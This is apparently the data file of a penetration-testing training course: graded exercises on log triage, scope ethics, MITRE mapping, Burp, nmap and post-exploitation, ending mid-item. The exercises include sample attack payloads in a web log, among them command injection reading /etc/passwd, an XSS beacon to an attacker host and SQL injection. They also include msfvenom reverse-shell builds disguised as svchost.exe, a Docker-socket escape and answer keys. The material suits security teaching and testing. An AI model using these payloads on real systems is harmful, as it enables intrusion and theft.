/* ================= HARD — exercises 1-8 ================= */
{
 id:'H01', t:'logview', th:5, title:'Spray, brute force, or something else?',
 sc:'<p>You are on the blue-team rotation during the purple-team exercise. The SIEM analyst hands you a filtered export of Windows logon events (4625 = failed logon, 4624 = successful logon) from the domain controller. Your red-team colleague used three techniques this morning; your client wants to know which logon lines belong to the <strong>password spraying</strong> campaign specifically.</p>',
 q:'<p>Select every line that is part of the password-spray campaign.</p>',
 hint:'Spraying = few attempts per account, many accounts, one source, then successes. One user with many failures is a different technique.',
 lines:[
  'time,event,user,source,logonType,result',
  '08:02:11,4624,svc_backup,10[.]30[.]4[.]9,Network,Success',
  '08:03:01,4625,a.reyes,198[.]51[.]100[.]7,Network,Fail',
  '08:03:02,4625,m.chen,198[.]51[.]100[.]7,Network,Fail',
  '08:03:03,4625,d.okafor,198[.]51[.]100[.]7,Network,Fail',
  '08:03:04,4625,s.patel,198[.]51[.]100[.]7,Network,Fail',
  '08:03:06,4625,a.reyes,198[.]51[.]100[.]7,Network,Fail',
  '08:05:19,4624,a.reyes,198[.]51[.]100[.]7,Network,Success',
  '08:05:21,4624,m.chen,198[.]51[.]100[.]7,Network,Success',
  '08:22:40,4625,administrator,203[.]0[.]113[.]99,Network,Fail',
  '08:22:43,4625,administrator,203[.]0[.]113[.]99,Network,Fail',
  '08:22:46,4625,administrator,203[.]0[.]113[.]99,Network,Fail',
  '08:41:02,4624,j.hart,10[.]30[.]4[.]50,Interactive,Success',
  '08:55:13,4624,j.hart,10[.]30[.]4[.]50,NewCredentials,Success',
  '09:01:33,4634,svc_backup,10[.]30[.]4[.]9,Network,Logoff'
 ],
 bad:[2,3,4,5,6,7,8],
 ex:'The spray signature is one source (198[.]51[.]100[.]7) touching many normal usernames with one or two tries each, ending in two 4624 successes for a.reyes and m.chen — lines 3-9, all from that source. Lines 10-12 are a different technique: one account (administrator) hit many times from another source, which is classic brute force, not spraying. Line 14 is a NewCredentials (type 9) logon — the pass-the-hash / over-pass-the-hash pattern, a third technique entirely. Lines 2, 13, 15 are routine service and workstation activity. Reading ratios (accounts per source, tries per account) is what separates the techniques in real SIEM triage.'
},
{
 id:'H02', t:'qcm', th:0, title:'Scope change on a Friday afternoon',
 sc:'<p>Day 3 of the Northwind Health external test. The CTO calls you directly: <em>"We just acquired ClipperFreight. Their VPN gateway is being attacked in the wild — scan and test it too, consider this verbal approval. It is urgent."</em> The signed RoE and scope list only northwindhealth systems. Your deconfliction contact (the CISO) is unreachable for six hours. The RoE contains a change-control clause: scope changes require written amendment signed by the CISO.</p>',
 q:'<p>What is the correct professional action?</p>',
 hint:'Who can legally authorize new systems, and what does the RoE say the process is — even when it is urgent?',
 opts:[
  {id:'a', tx:'Scan the gateway lightly, citing the CTO\'s verbal approval as cover'},
  {id:'b', tx:'Document the request and wait for the written amendment before testing'},
  {id:'c', tx:'Test it fully now and backfill the amendment paperwork afterwards'},
  {id:'d', tx:'Ask the CTO to send a confirming email and treat that as the amendment'}
 ],
 a:'b',
 ex:'The RoE change-control clause is explicit: scope changes need a written amendment signed by the CISO. Verbal pressure, however senior, does not amend a legal authorization — and the acquisition makes ClipperFreight systems a different legal entity, so the risk of acting without papers is real, urgent or not. Scanning "lightly" (a) is still unauthorized activity; backfilling paperwork (c) means the work happened without permission, which no court or insurer accepts; an email from the CTO (d) is not the signature the RoE demands. The professional move is exactly b: document the request, escalate through the agreed deconfliction path, and hold until the amendment exists. Urgency is a property of the client\'s process, not a license to skip it.'
},
{
 id:'H03', t:'dnd', th:4, title:'Map the techniques to MITRE ATT&CK tactics',
 sc:'<p>Your red-team lead is building the attack-narrative slide for the Northwind Health debrief. She pastes five techniques your team used and asks you to map each to the correct MITRE ATT&CK tactic column, because the client\'s detection coverage is measured per tactic.</p>',
 q:'<p>Drag each technique onto the tactic it represents.</p>',
 hint:'Think about the goal of each step, not the tool. First foothold, running code, listing the world, grabbing logins, looking legitimate.',
 items:[
  {id:'i0', tx:'Exploit the public Tomcat CVE from the internet'},
  {id:'i1', tx:'Spawn a PowerShell one-liner payload on the host'},
  {id:'i2', tx:'Enumerate SMB shares and user lists with enum4linux'},
  {id:'i3', tx:'Brute-force SSH logins with Hydra'},
  {id:'i4', tx:'Rename the beacon binary to svchost.exe and run it from %TEMP%'}
 ],
 slots:[
  {id:'s0', tx:'Initial Access'},
  {id:'s1', tx:'Execution'},
  {id:'s2', tx:'Discovery'},
  {id:'s3', tx:'Credential Access'},
  {id:'s4', tx:'Defense Evasion'}
 ],
 a:{s0:'i0', s1:'i1', s2:'i2', s3:'i3', s4:'i4'},
 ex:'Exploiting the internet-facing Tomcat bug is how you get in — Initial Access. The PowerShell payload run is Execution (code running on the host, whatever the entry). SMB/share/user enumeration is Discovery — learning the environment. Hydra against SSH is Credential Access — obtaining logins. The renamed beacon is the subtle one: a malicious binary called svchost.exe, running from %TEMP%, is Masquerading — its goal is to look legitimate, so ATT&amp;CK files it under Defense Evasion. (The same intent rule explains near-misses: a login with a valid cracked account can touch Initial Access and Defense Evasion at once — which is exactly why the tactic column follows the WHY, never the tool.) Mapping by intent is the whole skill: the same tool can serve different tactics depending on why it was used.'
},
{
 id:'H04', t:'term', th:2, title:'Terminal — map the subnet without touching TCP',
 sc:'<p>The Northwind scope includes 10[.]60[.]2[.]0/24. The monitoring team has asked you to keep the noise down: your first pass must discover live hosts <strong>without completing any TCP connection</strong>, and save the results to a file for the evidence folder. You are root on your Kali box. The exercise checks the command you type.</p>',
 q:'<p>Type the command that performs a ping-style host discovery across the /24 and writes output to a file (for example hosts.txt). No tool name is given — choose it yourself.</p>',
 hint:'Think "discovery only, no port scan, no handshake". Your chosen tool needs a list-scan mode (its flag starts with -s) plus the network and an output flag.',
 banner:'root@kali:~#',
 fs:{'/root/notes.txt':'Engagement: Northwind Health external\nScope: 10[.]60[.]2[.]0/24\nEvidence folder: /root/evidence/'},
 tasks:[
  {desc:'Discover live hosts across 10[.]60[.]2[.]0/24 without full TCP connects; save results to a file.',
   all:[/nmap/i, /-sn\b|-sP\b/i, /10\[?\.\]?60\[?\.\]?2\[?\.\]?0\/24/i, /-o[a-ng]\b|>\s*\S+/i],
   none:[/-sS\b|-sT\b|-sV\b|-sU\b/i], sol:'nmap -sn 10[.]60[.]2[.]0/24 -oN hosts.txt'}
 ],
 ex:'The right call is nmap in list-discovery mode: -sn (historically -sP) sends ping-class probes — ICMP, and a small set of TCP SYNs to 80/443 that are never completed — and reports which hosts are up, without any port scan. Adding the CIDR covers the whole /24, and -oN (or -oA/-oG) saves evidence for the report. Any of -sS, -sT, -sV or -sU would turn this into a port scan and break the "no TCP connects" promise. On many networks a plain ICMP-only sweep misses firewalled-but-alive hosts, which is why the hybrid -sn probes are the professional default. Choosing the tool and the mode yourself — instead of copying a command — is exactly what this hard exercise trains.'
},
{
 id:'H05', t:'branch', th:8, title:'Low-priv shell in a container — think before you pull the trigger',
 sc:'<p>You have a www-data shell on app02 (in scope). Quick facts: the kernel is recent and fully patched; <code>/.dockerenv</code> exists; your user is in the <strong>docker</strong> group; the docker socket /var/run/docker.sock is readable. The RoE forbids persistence and destructive operations, and requires you to remove uploaded tools.</p>',
 q:'<p>Choose the best action at each step.</p>',
 hint:'The patched kernel kills one whole family of exploits. Group memberships and sockets are the modern privilege path.',
 steps:[
  {q:'<p>First move after the initial shell?</p>',
   opts:[
    {tx:'Full local enumeration: id/groups, SUID files, sudo -l, capabilities, sockets', ok:true, out:'Enumeration reveals the docker group membership and the readable docker.sock.'},
    {tx:'Run a public kernel privilege-escalation exploit immediately', ok:false, out:'The kernel is fully patched — the exploit fails or, worse, panics the host.'},
    {tx:'Ask the client IT for a root password', ok:false, out:'That breaks the test premise and is not how authorization works.'}
   ]},
  {q:'<p>Enumeration done: docker group + readable docker.sock, patched kernel. What now?</p>',
   opts:[
    {tx:'Escape to the host via the docker socket (mount the host filesystem into a privileged container)', ok:true, out:'You get host-level access cleanly, using the group membership the host itself granted.'},
    {tx:'Keep hunting kernel exploits — the container kernel must be old', ok:false, out:'The container shares the host kernel, which you already know is patched.'},
    {tx:'Report and stop — a container cannot be escaped', ok:false, out:'Group membership in docker is a full host takeover; the finding is real and important.'}
   ]},
  {q:'<p>You are effectively root on the host. RoE: no persistence, cleanup required. Final step?</p>',
   opts:[
    {tx:'Capture proof (flag file, screenshots), remove staged tools and containers, document everything', ok:true, out:'Impact proven, host clean, evidence ready for the report.'},
    {tx:'Plant an SSH key for the debrief demonstration', ok:false, out:'That is persistence — the RoE forbids it and the demo does not need it.'},
    {tx:'Download and archive the customer database', ok:false, out:'Copying real data breaches the no-exfiltration rule; synthetic proof is enough.'}
   ]}
 ],
 ex:'Step 1: enumeration first is not a formality — id and groups expose the docker membership, and listing sockets finds docker.sock; both facts choose the whole attack path. Step 2: the container shares the host kernel, so a "patched kernel" verdict inside the container also covers the host — kernel exploits are the wrong family. The docker group is effectively root by design: mounting the host root into a privileged container is a clean, reliable escape. Step 3: the professional close-out is proof plus cleanup; SSH keys planted for convenience are persistence (forbidden), and exporting customer data is exfiltration (forbidden). Hard exercises punish reflexes: the "obvious" kernel exploit was a trap twice.'
},
{
 id:'H06', t:'match', th:2, title:'Whose output is this?',
 sc:'<p>During the Northwind engagement handover you inherit a folder of unlabeled evidence snippets. Before they go into the report appendix, each must carry the tool that produced it. Six snippets, six tools.</p>',
 q:'<p>Match each output snippet to the tool that produced it.</p>',
 hint:'Read the vocabulary: session numbers, "Loaded ... hash", Hash.Mode, "parameter is vulnerable", banner lines, "successfully completed".',
 lefts:['msf6 > [+] 10[.]60[.]2[.]30:445 - Meterpreter session 1 opened','[*] Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX])','Session..........: hashcat\nHash.Mode........: 1000 (NTLM)','[INFO] the GET parameter \'q\' is \'AND 1=1\' injectable','220 mail02 ESMTP Postfix (responds to VRFY)','[ATTEMPT] target ssh://10[.]60[.]2[.]40:22 - login "ops" - pass "Spring2025!"\n[+] ssh://... successfully completed'],
 rights:['Hydra','Metasploit (msfconsole)','SQLmap','John the Ripper','Hashcat','netcat (banner grab)'],
 a:[1,3,4,2,5,0],
 ex:'Each tool has a fingerprint. "Meterpreter session opened" only comes from Metasploit. "Loaded N password hash" is John the Ripper\'s startup line, while the block with Session/Hash.Mode fields is Hashcat\'s status format (mode 1000 = NTLM). "parameter is injectable" is SQLmap\'s confirmation of SQL injection. A raw SMTP banner with VRFY behavior is what netcat shows you on a silent connection. And Hydra\'s success line pairs ATTEMPT with "successfully completed" against a live service. Labeling evidence correctly matters twice over: the report must say which tool proved what, and defenders must know which tool noise looks like in their logs.'
},
{
 id:'H07', t:'fib', th:6, title:'The Burp Suite workflow, in order',
 sc:'<p>You are testing the Northwind patient-portal (in scope, synthetic data). The workflow your lead demands: intercept the login POST, replay it manually while editing the token parameter, then fuzz that parameter automatically, and read the base64 token as text. Four module names dropped out of the runbook.</p>',
 q:'<p>Fill all four blanks with the right Burp module.</p>',
 hint:'Interception, manual replay, automated fuzzing, decoding — one module each. Two bank entries are decoys.',
 text:'(1) Capture the login POST live in the {{0}} module.\n(2) Right-click → Send to {{1}} for manual, editable re-sends.\n(3) Load the 5,000 payload list into {{2}} for the fuzzing run.\n(4) Paste the base64 token into {{3}} to read it as plain text.',
 bank:['Proxy','Repeater','Intruder','Decoder','Spider','Sequencer'],
 a:['Proxy','Repeater','Intruder','Decoder'],
 ex:'Proxy is where interception happens (request and response pause in front of you). Repeater is the manual workbench: edit, resend, compare — no automation, full control. Intruder is the automation engine: payload lists, attack positions, and response comparison (response lengths and timings expose differences). Decoder converts base64, URL-encoding, hex and more. The two decoys: the Spider crawls and maps a site, and the Sequencer measures randomness of session tokens — a different test (token entropy), not decoding. Knowing the four core modules cold turns the portal test from clicking around into a controlled workflow.'
},
{
 id:'H08', t:'multi', th:3, title:'Two of these findings are probably scanner noise',
 sc:'<p>The Northwind Nessus run (non-credentialed) returned five flagged items. Your credentialed spot-check script ran against the same hosts right after. You must decide which two flags are most likely false positives before anything reaches the report. Facts: the web host runs a Debian backport of Apache; the DC is fully patched and the scan ran credentialed checks minutes later; nothing else contradicts items 3-5.</p>',
 q:'<p>Select the two findings most likely to be <strong>false positives</strong>.</p>',
 hint:'Banner-based version detection can be fooled by vendor backports. And a credentialed check outranks a network guess on patch state.',
 opts:[
  {id:'a', tx:'"Apache 2.4.49 traversal" — the package is a Debian backport of 2.4.49'},
  {id:'b', tx:'"MS17-010 missing" on the DC — a credentialed check shows it patched'},
  {id:'c', tx:'"TLS self-signed certificate in use" on the internal backup appliance'},
  {id:'d', tx:'"SMBv1 protocol enabled" on the legacy print server in the print room'},
  {id:'e', tx:'"Ubuntu 16.04 reached end of life" on an isolated build runner VM'}
 ],
 a:['a','b'],
 ex:'(a) is the classic banner trap: Debian backports ship patched code under the old upstream version string, so the plugin screams CVE-2021-41773 while the actual code is fixed — a false positive to verify manually before reporting. (b) contradicts fresher evidence: a credentialed patch check outranks a network probe, and MS17-010 plugins are known to misfire behind certain filtering — flag for verification. (c), (d) and (e) are real, reportable hygiene findings even when their severity is modest: self-signed certs, SMBv1 on a legacy box, and an EOL OS. The professional habit is to treat scanner output as a lead, not a verdict — and to say in the report which findings were verified and how.'
},
/* ================= HARD — exercises 9-16 ================= */
{
 id:'H09', t:'order', th:8, title:'Simulating the intruder — post-exploitation sequence',
 sc:'<p>The Northwind purple-team scenario asks you to emulate an intruder end-to-end on an isolated lab copy of the network. You already hold a low-priv Meterpreter session on a workstation. The scenario rules: prove the full chain, disturb nothing, clean everything at the end.</p>',
 q:'<p>Put the six post-exploitation actions into the order a disciplined operator follows.</p>',
 hint:'You cannot move sideways without credentials, and you do not clean before you finish.',
 items:[
  'Escalate local privileges (getsystem or a local exploit)',
  'Dump credential material (mimikatz / hashdump)',
  'Move laterally to a second host with valid credentials (pass the hash)',
  'Establish persistence on the newly reached host (lab only)',
  'Document and collect evidence of every step',
  'Remove tools, revert changes, and restore clean state'
 ],
 ex:'The operator order is driven by dependencies: privileges first (getsystem or a local exploit), because credential dumping needs rights to memory. Credentials (mimikatz/hashdump) then unlock lateral movement — pass the hash needs hashes, after all. Persistence belongs on the NEW host and after you reach it (and only because this lab scenario explicitly allows it; a normal pentest RoE forbids it). Evidence collection is continuous but formalized at the end, and cleanup is strictly last — reversing persistence and removing tools earlier would destroy your own access mid-exercise. This chain (escalate → dump → lateral → persist → document → clean) is the backbone of almost every serious intrusion simulation.'
},
{
 id:'H10', t:'qcm', th:7, title:'Evil twin on a WPA2-Enterprise network',
 sc:'<p>Your airodump-ng survey of the Northwind campus (authorized for client-side wireless attacks) shows two APs broadcasting the SSID "NWH-CORP": the real ones use WPA2-Enterprise (802.1X) with valid certificates; a new BSSID in the lobby broadcasts the same SSID but runs a captive portal page instead. Your objective: demonstrate that employees will surrender domain credentials to a rogue AP. Deauth is authorized within limits; cracking the enterprise handshake is not feasible by design.</p>',
 q:'<p>Which attack path actually achieves the objective?</p>',
 hint:'Enterprise Wi-Fi does not give you a PSK to crack. What do users type willingly into a portal that looks right?',
 opts:[
  {id:'a', tx:'Capture and crack the 4-way handshake offline with a wordlist'},
  {id:'b', tx:'Run Reaver against the corporate APs to recover their WPS PIN'},
  {id:'c', tx:'Deauth lobby clients onto your twin and harvest portal logins'},
  {id:'d', tx:'ARP-poison the real AP to intercept 802.1X frames and passwords'}
 ],
 a:'c',
 ex:'WPA2-Enterprise has no pre-shared key to crack — the 4-way handshake derives from session material, so path (a) burns hours for nothing. WPS (b) is typically disabled on enterprise gear, and even when present it says nothing about domain credentials. ARP poisoning (d) operates at layer 2 inside an association you do not have, and 802.1X frames do not leak passwords anyway. The evil twin (c) is the designed lesson: deauth nudges clients to the stronger-looking rogue AP, and the cloned portal harvests whatever users type — usually domain credentials, which is exactly the risk the client needs demonstrated. The twin\'s fingerprint (same SSID, different BSSID, no 802.1X) is also what defenders hunt for.'
},
{
 id:'H11', t:'logview', th:6, title:'Encoded payloads in the web log',
 sc:'<p>Day 2 of the Northwind test, 14:00-15:00 window. The web log of the patient portal is in front of you. Your own authorized scanner ran from 10[.]60[.]2[.]200 inside the window (Nikto signatures). One external source, 203[.]0[.]113[.]88, is definitely not yours.</p>',
 q:'<p>Select every line showing <strong>malicious external attack traffic</strong> (not your authorized scan, not normal traffic).</p>',
 hint:'Decode before you judge: base64 in a parameter and %-encoded quotes both hide payloads. Your scanner IP is authorized noise.',
 lines:[
  '203[.]0[.]113[.]88 - "GET /patient?id=MSd8J3Bhc3N3b3Jk HTTP/1.1" 200 - "-" "python-requests/2.31"',
  '10[.]60[.]2[.]200 - "GET /images/ HTTP/1.1" 404 0 "-" "Nikto/2.5.0"',
  '203[.]0[.]113[.]88 - "GET /api/v1/records?filter=1%29%20AND%20%28SELECT%20COUNT%28*%29%20FROM%20users%29%3E0 HTTP/1.1" 200 - "-" "python-requests/2.31"',
  '198[.]51[.]100[.]12 - "GET /portal/home HTTP/1.1" 200 5301 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
  '203[.]0[.]113[.]88 - "POST /api/v1/report/run HTTP/1.1" 200 - "-" "python-requests/2.31" {\'cmd\': \'; cat /etc/passwd\'}',
  '10[.]60[.]2[.]200 - "GET /static/ HTTP/1.1" 404 0 "-" "gobuster/3.6 (authorized window)"',
  '203[.]0[.]113[.]88 - "GET /profile?name=<img src=x onerror=fetch(//evil[.]xyz/c)> HTTP/1.1" 200 - "-" "python-requests/2.31"',
  '198[.]51[.]100[.]12 - "GET /portal/style.css HTTP/1.1" 200 1420 "-" "Mozilla/5.0"',
  '203[.]0[.]113[.]88 - "GET /patient?id=MScgVU5JT04gU0VMRUNUIHVzZXIscHdkIEZST00gdXNlcnM= HTTP/1.1" 200 - "-" "python-requests/2.31"',
  '10[.]60[.]2[.]5 - "GET /health HTTP/1.1" 200 3 "-" "-" "kube-probe/1.29"',
  '203[.]0[.]113[.]88 - "GET /favicon.ico HTTP/1.1" 200 1150 "-" "python-requests/2.31"'
 ],
 bad:[0,2,4,6,8],
 ex:'Five lines carry the external attacker (203[.]0[.]113[.]88): line 1 hides a quote-and-pipe probe in base64 — MSd8J3Bhc3N3b3Jk decodes to 1\x27|\x27password, a probe of the id parameter — line 3 is a boolean-blind SQLi with %-encoding, line 5 is OS command injection against a report endpoint, line 7 is an XSS beacon to evil[.]xyz, and line 9 is base64 SQLi again — MScgVU5JT04gU0VMRUNUIHVzZXIscHdkIEZST00gdXNlcnM= decodes to 1\x27 UNION SELECT user,pwd FROM users. The Nikto and gobuster lines are your own authorized scanner; the 198[.]51[.]100[.]12 traffic is a normal browser session; the kube-probe is infrastructure. The lesson: the same attack appears three ways — raw, URL-encoded, and base64 — and a log reviewer who does not decode sees only "weird strings".'
},
{
 id:'H12', t:'spot', th:4, title:'Spot the msfvenom mistake',
 sc:'<p>Your teammate builds a payload for an in-scope Windows box. His Nmap -O fingerprint (in the notes file, line 1) is authoritative. His build commands follow. One line guarantees the payload will not execute on the target.</p>',
 q:'<p>Click the line that contains the fatal mistake.</p>',
 hint:'Match the payload architecture against the OS line. One character family decides this.',
 code:[
  '# NOTE: nmap -O says target = Microsoft Windows 7 SP1, x86 (32-bit)',
  'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10[.]60[.]2[.]77 LPORT=8443 -f exe -o svchost.exe',
  'msfvenom --list encoders | head -20',
  'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10[.]60[.]2[.]77 LPORT=8443 -e x86/shikata_ga_nai -i 3 -f exe -o svchost2.exe',
  '# handler: msfconsole → use exploit/multi/handler → set LHOST/LPORT → run'
 ],
 bad:[1],
 ex:'Line 2 builds an x64 payload for a target the fingerprint (line 1) says is 32-bit x86 Windows 7 — a 64-bit binary simply will not run there, so the whole delivery dies silently or errors on execution. Line 4 is the corrected build: windows/meterpreter/reverse_tcp is the x86-compatible payload, with the shikata_ga_nai encoder applied (useful historically to change signatures, though modern EDR sees through single-pass encoding). Lines 3 and 5 are normal housekeeping. The handler on line 5 needs no change. Architecture mismatches are among the most common reason payloads "never phone home" — always read the OS line before choosing the payload string.'
},
{
 id:'H13', t:'qcm', th:9, title:'Which finding gets fixed first?',
 sc:'<p>Your remediation workshop with Northwind has budget for one item this sprint. Three confirmed findings: (A) unauthenticated SQLi on the internet-facing appointment API, CVSS 8.6; (B) local privilege escalation on the two jump hosts, CVSS 7.8, requires an authenticated session on the host already; (C) reflected XSS on the internal wiki, CVSS 6.1, internal only, requires the victim to click a link. Exploit code for (A) is public and actively used in the wild.</p>',
 q:'<p>Which finding do you put first in the remediation plan?</p>',
 hint:'Rank by exposure and the attacker\'s effort, not by the biggest number alone.',
 opts:[
  {id:'a', tx:'(B) the jump host privilege escalation — highest local impact'},
  {id:'b', tx:'(C) the internal wiki XSS — users click links all the time'},
  {id:'c', tx:'(A) the internet-facing SQLi — no auth, public exploit, data access'},
  {id:'d', tx:'Strictly follow the CVSS order: A first, then B, then C — no debate'}
 ],
 a:'c',
 ex:'Finding (A) combines everything that raises real-world risk: internet exposure, no authentication required, a working public exploit being used right now, and direct access to appointment data. (B) is nasty but needs an attacker already on the host (a second step, not an entry). (C) is internal and needs a click. Option (d) is the trap: strict CVSS ordering happens to coincide here at the top, but the reasoning is wrong — CVSS alone ignores exposure and exploitability, and on another day the 7.8 local bug could outrank an 8.6 internal one. Risk = severity × exposure × likelihood. The executive summary should say exactly this in one sentence.'
},
{
 id:'H14', t:'dnd', th:5, title:'Match each attack to its strongest control',
 sc:'<p>The Northwind debrief turns into a controls workshop. For each demonstrated attack, the client wants the ONE control that most directly breaks that attack — not generic advice. You drafted the mapping; six pairs must survive their architect\'s review.</p>',
 q:'<p>Drag each attack onto the control that most directly defeats it.</p>',
 hint:'Rainbow tables die to randomness per password; replayed breach pairs die to a second factor; stolen NTLM dies to credential guard; forced disconnects die to a protected management frame; injection dies before it reaches SQL; guessing dies to friction.',
 items:[
  {id:'i0', tx:'Rainbow table hash lookup'},
  {id:'i1', tx:'Credential stuffing with breach lists'},
  {id:'i2', tx:'Pass the hash with dumped NTLM'},
  {id:'i3', tx:'Deauth-forced WPA2 handshake capture'},
  {id:'i4', tx:'SQL injection on the portal'},
  {id:'i5', tx:'Online password brute force'}
 ],
 slots:[
  {id:'s0', tx:'Unique per-password salts (slow hash + salt)'},
  {id:'s1', tx:'MFA on all internet-facing logins'},
  {id:'s2', tx:'Credential Guard / no NTLM reuse'},
  {id:'s3', tx:'802.11w Protected Management Frames'},
  {id:'s4', tx:'Parameterized queries (prepared statements)'},
  {id:'s5', tx:'Rate limiting + account lockout thresholds'}
 ],
 a:{s0:'i0', s1:'i1', s2:'i2', s3:'i3', s4:'i4', s5:'i5'},
 ex:'Salted slow hashes destroy rainbow tables: the salt forces attackers to build a new precomputed table per password, which makes precomputation pointless. Credential stuffing replays old breach pairs, so MFA breaks it even when the password is reused. Pass the hash lives entirely on reusable NTLM data — Credential Guard (or eliminating NTLM) removes the material it needs. Deauthentication forges 802.11 management frames; 802.11w (PMF) makes those frames integrity-protected, so the forced-disconnect trick stops working. SQL injection dies at the code layer: parameterized queries keep data and code separate, which no WAF tuning fully guarantees. Online brute force dies to friction: rate limits and lockouts make the attack slower than the business can tolerate. One control per attack, chosen at the layer the attack actually operates on.'
},
{
 id:'H15', t:'branch', th:6, title:'SQLmap confirmed DBA rights — where is the line?',
 sc:'<p>On the Northwind appointment API (in scope), sqlmap confirms the injection and that the DB user has DBA rights. The RoE says: no real patient data may leave the system; synthetic proof only; no persistence; document and clean up. The temptation is enormous.</p>',
 q:'<p>Choose the compliant action at each decision point.</p>',
 hint:'Every step: does this copy patient data? does this leave something behind? would the evidence still prove impact without it?',
 steps:[
  {q:'<p>sqlmap offers --dump on the users table. What do you run instead?</p>',
   opts:[
    {tx:'--schema to enumerate tables and columns, plus row counts for impact', ok:true, out:'Structure and counts prove depth of access with zero patient rows copied.'},
    {tx:'--dump-users: three rows as "samples" for the report', ok:false, out:'Any real row copied is a RoE breach and a privacy problem.'},
    {tx:'Nothing — DBA rights are theoretical and need no proof', ok:false, out:'Undemonstrated impact reads as speculation; prove it synthetically.'}
   ]},
  {q:'<p>sqlmap can open an --os-shell on the DB host. RoE allows code execution proof but no persistence. What is correct?</p>',
   opts:[
    {tx:'Open the shell, capture whoami/hostname as evidence, exit, and remove any staged files', ok:true, out:'Execution proven in minutes, nothing left behind.'},
    {tx:'Keep the shell open for the client demo next week', ok:false, out:'A standing shell is persistence — exactly what the RoE forbids.'},
    {tx:'Pivot from the shell into every internal database and map them all', ok:false, out:'Unbounded pivoting exceeds the agreed scope and multiplies risk.'}
   ]},
  {q:'<p>Time to write the finding. What belongs in the report?</p>',
   opts:[
    {tx:'Defanged PoC requests/responses, DBA proof, impact note, and the fix: parameterized queries + least-privilege DB account', ok:true, out:'Complete, safe, and actionable — the finding and its cure in one place.'},
    {tx:'The raw patient rows as an appendix "for completeness"', ok:false, out:'Raw PII in a report is a second incident on top of the first.'},
    {tx:'Just "SQL injection exists, fix it" — details stay in the tester\'s notes', ok:false, out:'Reproducibility is what makes a finding verifiable and fixable.'}
   ]}
 ],
 ex:'Decision 1: --schema (with counts) is the professional compromise — it proves full control of the database without copying a single patient record; --dump crosses the line even "as samples". Decision 2: an os-shell is a legitimate execution proof when captured and closed immediately; leaving it running for a demo is persistence by any definition, and unbounded pivoting exceeds the engagement\'s agreed boundaries. Decision 3: evidence must be defanged (hxxp, 10[.]60[...] style), reproducible, and paired with the real fix — parameterized queries close the injection class, and a least-privilege DB account shrinks what the next injection can reach. The pattern: prove deeply, copy nothing, leave nothing, fix the class.'
},
{
 id:'H16', t:'match', th:2, title:'Nmap timing and evasion — what the flag really buys you',
 sc:'<p>The Northwind IDS team reviewed your scan traffic and asks you to explain, flag by flag, what each choice did — their report feeds their detection-tuning roadmap. Precision wins arguments here.</p>',
 q:'<p>Match each flag to the effect it had on the wire.</p>',
 hint:'Two flags are timing extremes, two shape the packets, one fakes sources, one borrows a third host.',
 lefts:['-T0','-T5','-D RND:5','--data-length 24','-f','-sI zombiehost'],
 rights:['Idle scan: the scan appears to come from a third host','Fragment packets into tiny pieces (8-byte data fragments)','Slowest serial scan — minutes between probes, evades rate-based alerts','Fastest template — full parallel speed, very noisy and less accurate','Appends 24 random bytes to every probe, changing packet size and signatures','Sprays decoy source addresses alongside yours in the target logs'],
 a:[2,3,5,4,1,0],
 ex:'-T0 is the paranoid template: serial, patient, minutes between probes — rate-based detection sees almost nothing, at the cost of a very slow scan. -T5 (insane) is the opposite: maximum parallelism, fastest results, but noisy and prone to missing ports under load. -D RND:5 adds five random decoy sources, so the target logs list many possible scanners. --data-length 24 pads every probe with random bytes, altering size and some signatures. -f fragments packets into 8-byte pieces, annoying simple reassembly-based rules. -sI is the idle scan: the zombie host\'s IP is what appears in the target logs while you read the zombie\'s IP-ID counters — the closest classic Nmap gets to true source anonymity. Tools like hping3 play the same shaping game by hand.'
},
/* ================= HARD — exercises 17-23 ================= */
{
 id:'H17', t:'sim', th:0, title:'Go / No-Go under pressure',
 sc:'<p>Final day of the Northwind external test. Four situations land in your queue within ten minutes. The RoE: scope = 10[.]60[.]2[.]0/24 plus the two web hosts; no DoS; no data exfiltration of real records; all findings documented; the deconfliction contact answers within the hour. Decide each ticket.</p>',
 q:'<p>For each ticket, choose the correct handling.</p>',
 hint:'Four filters, in order: in scope? destructive? copies real data? documented? Apply them in that order, every time.',
 cards:[
  {ctx:'<p><b>ticket A:</b> A working unauthenticated RCE exploit exists for web01 (in scope). Running it spawns a shell; it does not damage the service.</p>',
   q:'Go or no-go?',
   opts:[
    {tx:'GO — exploit once, capture evidence, report', ok:true, out:'Clean in-scope proof of a critical flaw; this is the core of the engagement.'},
    {tx:'NO-GO — RCE is always too dangerous', ok:false, out:'A safe, in-scope, non-destructive exploit is exactly what you are paid to verify.'}
   ]},
  {ctx:'<p><b>ticket B:</b> You found valid credentials that also work on the finance CRM — hosted by the vendor, NOT in the scope list.</p>',
   q:'Go or no-go?',
   opts:[
    {tx:'NO-GO — document the credential reuse finding and notify the client contact', ok:true, out:'Impact noted, hands off; scope extension is the client\'s decision in writing.'},
    {tx:'GO — it proves password reuse, so logging in once is justified', ok:false, out:'Authorization ends at the scope boundary; the vendor system is untouchable.'}
   ]},
  {ctx:'<p><b>ticket C:</b> A proof-of-concept for the core router would take it down (the only reliable trigger crashes the process). The router is in scope.</p>',
   q:'Go or no-go?',
   opts:[
    {tx:'NO-GO — the RoE forbids DoS; report the vulnerability unproven with references', ok:true, out:'The no-DoS clause wins; scanner data plus public advisories carry the finding.'},
    {tx:'GO — one crash at 17:59 hurts nothing', ok:false, out:'A crashed core router ends connectivity for the whole site — and the contract.'}
   ]},
  {ctx:'<p><b>ticket D:</b> An open file share exposes a folder that contains real employee PII (names, salaries). Read access exists by accident. In scope.</p>',
   q:'Go or no-go?',
   opts:[
    {tx:'Stop, document existence and exposure (paths, ACLs, a redacted listing), notify immediately — do not copy files', ok:true, out:'Exposure proven with metadata; zero records copied; client notified fast.'},
    {tx:'Download the folder as evidence', ok:false, out:'Copying real PII breaches the exfiltration rule and creates a second incident.'}
   ]}
 ],
 ex:'Ticket A is a clean go: in scope, non-destructive, single-run evidence. Ticket B is a hard no-go — credentials that unlock an out-of-scope vendor system become a documented finding ("credential reuse"), never a login; scope extensions belong to the client in writing. Ticket C: the no-DoS clause overrides the desire to prove the crash; the finding stands on scanner evidence plus public advisories. Ticket D shows the evidence discipline: you may prove exposure with paths, permissions and redacted listings, but copying real PII is exfiltration and turns a finding into an incident. The order of filters matters: scope first, damage second, data third — feelings last.'
},
{
 id:'H18', t:'qcm', th:8, title:'The pivot that actually works',
